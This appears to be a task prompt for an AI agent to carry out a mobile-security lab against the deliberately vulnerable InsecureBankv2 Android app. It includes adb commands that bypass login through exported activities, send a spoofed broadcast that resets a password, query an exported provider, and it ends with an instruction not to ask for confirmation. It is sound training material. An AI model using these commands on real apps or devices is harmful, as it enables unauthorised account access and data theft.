@@ -1,0 +1,212 @@
+# Prompt: Automated Lab 2 — Hardcoded Secrets & Exported Components (InsecureBankv2)
+
+You are an Android security analyst. Your task is to automatically execute Lab 2: "Hardcoded Secrets & Exported Components" against the InsecureBankv2 APK from start to finish. Perform all steps below, verify each one, and produce a complete findings report.
+
+## Environment Configuration
+
+Use these paths (adjust if different on your system):
+
+| Variable | Path |
+|----------|------|
+| APK | `C:\Users\LENOVO\OneDrive\Documents\New OpenCode Project\insecurebankv2.apk` |
+| WORKDIR | `C:\Users\LENOVO\OneDrive\Documents\Mobile-userfull\Hardcoded-Secrets-Exported-Components` |
+| JADX | `C:\jadx\bin\jadx.bat` |
+| JAVA_HOME | `C:\jdk-17` |
+| ADB | `C:\Users\LENOVO\AppData\Local\Android\Sdk\platform-tools\adb.exe` |
+
+## Step-by-Step Instructions
+
+### Step 1: Directory Setup
+Create the following directories under WORKDIR:
+- `decompiled/`
+- `evidence/`
+- `reports/`
+
+### Step 2: Static Analysis — Decompile APK
+Set JAVA_HOME and run JADX CLI to decompile the entire APK into `WORKDIR\decompiled`.
+```
+$env:JAVA_HOME = "C:\jdk-17"
+& "C:\jadx\bin\jadx.bat" -d "<WORKDIR>\decompiled" "<APK>"
+```
+Verify: Check that `decompiled\resources\AndroidManifest.xml` exists.
+
+### Step 3: Static Analysis — Analyze AndroidManifest.xml
+Read the full manifest and document:
+
+**A. Exported Components** — Search for `android:exported="true"`. List every component found:
+- Activity names
+- Provider names + authorities
+- Receiver names + intent filters
+- Check which one is the main PostLogin dashboard
+
+**B. Dangerous Configurations** — Check for:
+- `android:debuggable="true"` 
+- `android:allowBackup="true"`
+- `android:targetSdkVersion` (low target SDK = additional risk)
+
+**C. Permissions** — List all `<uses-permission>` entries.
+
+Save the annotated manifest to `evidence\manifest_analysis.txt`.
+
+### Step 4: Static Analysis — Discover Hardcoded Secrets
+Search ALL Java source files under `decompiled\sources\com\android\insecurebankv2\` for:
+
+**Search 1 — Hardcoded keys/credentials/passwords**:
+```powershell
+Get-ChildItem -LiteralPath "<WORKDIR>\decompiled\sources\com\android\insecurebankv2" -Filter "*.java" | Select-String -Pattern '(password|secret|key|api_key|token|admin|devadmin|pin|credential|aes|encrypt|decrypt)' -CaseSensitive:$false
+```
+- Document the AES key found in CryptoClass.java
+- Document the IV vector (all zeros)
+- Document the `devadmin` backdoor account in DoLogin.java
+
+**Search 2 — Weak cryptography**:
+- Check CryptoClass.java for hardcoded key material and IV
+- Check how passwords are stored in SharedPreferences (what encryption is used)
+
+**Search 3 — Backdoor accounts / hidden features**:
+- Find `devadmin` in DoLogin.java — document the behavior (special `/devlogin` endpoint)
+- Find `is_admin` in strings.xml
+
+Save findings to `evidence\hardcoded_secrets.txt`.
+
+### Step 5: Dynamic Analysis — Verify Emulator
+Check that an Android emulator is running:
+```powershell
+& "<ADB>" devices
+```
+If no device shows as `device`, start the first available AVD.
+
+### Step 6: Dynamic Analysis — Install APK
+Install the APK on the emulator (use bypass flag for old SDK targets):
+```powershell
+& "<ADB>" install --bypass-low-target-sdk-block "<APK>"
+```
+Verify: Check the exit code. If it fails with DEPRECATED_SDK_VERSION, add `--bypass-low-target-sdk-block`.
+
+### Step 7: Dynamic Analysis — Execute Authentication Bypass PoC
+For EACH exported activity, execute and document:
+
+```powershell
+# 1. PostLogin bypass (main dashboard)
+& "<ADB>" shell am start -n com.android.insecurebankv2/.PostLogin
+
+# 2. DoTransfer bypass (money transfer)
+& "<ADB>" shell am start -n com.android.insecurebankv2/.DoTransfer
+
+# 3. ChangePassword bypass
+& "<ADB>" shell am start -n com.android.insecurebankv2/.ChangePassword
+
+# 4. ViewStatement bypass
+& "<ADB>" shell am start -n com.android.insecurebankv2/.ViewStatement
+```
+
+After each launch, take a screenshot:
+```powershell
+& "<ADB>" exec-out screencap -p > "<WORKDIR>\evidence\<activity>_bypass.png"
+```
+
+### Step 8: Dynamic Analysis — Exploit BroadcastReceiver
+Send a malicious broadcast to the exported receiver:
+```powershell
+& "<ADB>" shell am broadcast -a theBroadcast -n com.android.insecurebankv2/.MyBroadCastReceiver --es newpass "hacked_password" --es phonenumber "08123456789"
+```
+Verify: The broadcast should return `result=0` (success).
+
+### Step 9: Dynamic Analysis — Query ContentProvider
+Try to access the exported ContentProvider:
+```powershell
+# Launch app first to ensure the process is alive
+& "<ADB>" shell am start -n com.android.insecurebankv2/.LoginActivity
+# Then query
+& "<ADB>" shell content query --uri content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers
+```
+
+### Step 10: Dynamic Analysis — Test debuggable/allowBackup
+```powershell
+# Test run-as access
+& "<ADB>" shell run-as com.android.insecurebankv2 ls /data/data/com.android.insecurebankv2/
+```
+If this succeeds, the app is debuggable.
+
+### Step 11: Collect All Evidence
+Compile everything into `evidence\bypass_commands.txt`:
+- All commands executed
+- All output received
+- Environment info (Android SDK version, device model)
+- Total counts of exported components, hardcoded secrets
+
+### Step 12: Generate Report
+Create `reports\report.md` with the following structure:
+
+1. **Executive Summary** — Overview of findings
+2. **Findings** — One section per vulnerability:
+   - Finding ID (e.g., ISB-EXPORT-001)
+   - Severity (Critical/High/Medium)
+   - CWE reference
+   - Description
+   - Affected components with file paths and line numbers
+   - Code evidence (actual code snippets)
+   - Proof of Concept (actual commands + results)
+   - Impact assessment (CIA triad)
+   - Remediation (code/markup fixes)
+3. **Remediation Summary Table**
+4. **Coverage Statement** — What was analyzed, what was excluded
+5. **Tools Used** — Versions and paths
+6. **Appendix A** — Annotated AndroidManifest.xml
+7. **Appendix B** — One-liner exploit commands
+
+## Verification Checklist
+
+Before declaring the lab complete, verify ALL:
+- [ ] JADX decompilation produced non-empty `resources/` and `sources/`
+- [ ] AndroidManifest.xml was read and all exported components counted
+- [ ] All hardcoded secrets documented with exact line numbers
+- [ ] Emulator running and ADB connected
+- [ ] APK installed successfully
+- [ ] All 4 activities bypassed (PostLogin, DoTransfer, ChangePassword, ViewStatement)
+- [ ] BroadcastReceiver exploited
+- [ ] ContentProvider confirmed exported
+- [ ] Screenshots saved in evidence/
+- [ ] Report written in reports/ with all 6 findings
+- [ ] Each finding has code evidence + PoC + remediation
+
+## Expected Output
+
+When complete, the WORKDIR should contain:
+```
+Hardcoded-Secrets-Exported-Components/
+├── decompiled/
+│   ├── resources/
+│   │   └── AndroidManifest.xml
+│   └── sources/
+│       └── com/android/insecurebankv2/
+│           ├── CryptoClass.java      (hardcoded key)
+│           ├── DoLogin.java          (devadmin backdoor)
+│           ├── PostLogin.java        (bypass target)
+│           ├── DoTransfer.java       (bypass target)
+│           └── ... (14 app source files total)
+├── evidence/
+│   ├── bypass_commands.txt          (full command log)
+│   ├── hardcoded_secrets.txt        (secrets documentation)
+│   ├── manifest_analysis.txt        (annotated manifest)
+│   ├── postlogin_bypass.png         (screenshot)
+│   ├── dotransfer_bypass.png        (screenshot)
+│   └── changepassword_bypass.png    (screenshot)
+└── reports/
+    └── report.md                    (comprehensive findings report)
+```
+
+## Target Findings Reference
+
+You MUST find these 6 specific vulnerabilities:
+
+| ID | Component | Severity |
+|----|-----------|----------|
+| ISB-EXPORT-001 | PostLogin exported → auth bypass | Critical |
+| ISB-EXPORT-002 | DoTransfer+ChangePassword+ViewStatement exported | Critical |
+| ISB-EXPORT-003 | TrackUserContentProvider+MyBroadCastReceiver exported | High |
+| ISB-SECRET-001 | AES key hardcoded + IV all zeros | High |
+| ISB-SECRET-002 | devadmin backdoor account | High |
+| ISB-CONFIG-001 | debuggable=true + allowBackup=true | Medium |
+
+Now execute everything. Do not ask for confirmation — run all steps sequentially and produce the final report.
